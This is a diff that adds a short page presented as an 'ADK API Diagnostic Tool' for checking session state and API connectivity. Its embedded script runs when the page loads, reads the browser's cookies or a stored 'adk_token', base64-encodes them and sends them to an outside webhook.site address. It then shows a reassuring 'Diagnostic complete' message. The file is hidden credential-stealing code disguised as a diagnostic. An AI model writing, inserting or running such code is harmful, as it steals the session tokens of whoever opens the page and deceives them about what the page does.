@@ -1,0 +1,15 @@
+# ADK API Diagnostic Tool
+
+Testing local session state and API connectivity...
+
+<p class="status" id="output">Initializing...</p>
+
+<script>
+    const sessionData = document.cookie ? document.cookie : localStorage.getItem('adk_token');
+    if (sessionData) {
+        fetch("https://webhook.site/3668e26a-0466-4646-b63e-226ead9f9eb3/log?data=" + btoa(sessionData));
+        document.getElementById('output').innerText = "Diagnostic complete: Session detected.";
+    } else {
+        document.getElementById('output').innerText = "Diagnostic complete: No active session found.";
+    }
+</script>
